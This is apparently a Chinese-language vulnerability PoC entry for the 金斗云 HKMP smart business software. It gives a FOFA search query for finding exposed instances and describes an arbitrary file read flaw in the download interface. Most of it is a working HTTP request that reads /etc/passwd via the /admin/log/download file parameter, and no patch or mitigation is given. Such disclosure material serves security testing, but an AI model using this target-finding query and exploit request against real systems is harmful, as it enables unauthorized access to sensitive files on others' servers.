**fofa**

```
body="金斗云 HKMP"
```

**一、漏洞简述**

金斗云 HKMP智慧商业软件是一款功能强大、‌易于使用的智慧管理系统，‌通过智能化的管理工具，‌帮助企业实现高效经营、‌优化流程、‌降低成本，‌并提升客户体验。‌无论是珠宝门店、‌4S店还是其他零售、‌服务行业，‌金斗云都能提供量身定制的解决方案，‌助力企业实现数字化转型和智能化升级。‌该软件帮助企业提升业绩、‌优化流程、‌降低成本，‌并增强客户体验。其接口download存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。

**二、漏洞检测poc**

```yaml
GET /admin/log/download?file=/etc/passwd HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Accept-Encoding: gzip
Connection: close


```

